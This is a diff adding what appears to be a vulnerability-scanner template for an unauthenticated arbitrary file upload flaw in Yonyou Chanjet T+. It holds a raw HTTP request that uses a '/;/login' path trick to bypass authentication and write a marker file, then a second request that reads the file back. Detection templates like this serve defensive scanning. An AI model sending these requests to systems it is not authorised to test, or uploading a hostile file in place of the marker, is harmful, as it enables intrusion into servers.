@@ -1,0 +1,42 @@
+id: poc-yaml-changjie-tplus-fileuploadhandler-upload
+info:
+  name: 用友畅捷通-TPlus FileUploadHandler.ashx 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: fileupload
+variables:
+  t1: '{{rand_int(100, 1000)}}'
+http:
+  - raw:
+      - |
+        POST /tplus/SM/SetupAccount/FileUploadHandler.ashx/;/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=f95ec6be8c3acff8e3edd3d910d3b9a6
+
+        --f95ec6be8c3acff8e3edd3d910d3b9a6
+        Content-Disposition: form-data; name="file"; filename="test{{t1}}.txt"
+        Content-Type: image/jpeg
+
+        This website has a vulnerability
+        --f95ec6be8c3acff8e3edd3d910d3b9a6--
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ""
+        part: body
+  - raw:
+      - |
+        GET /tplus/UserFiles/test{{t1}}.txt HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "This website has a vulnerability"
+        part: body
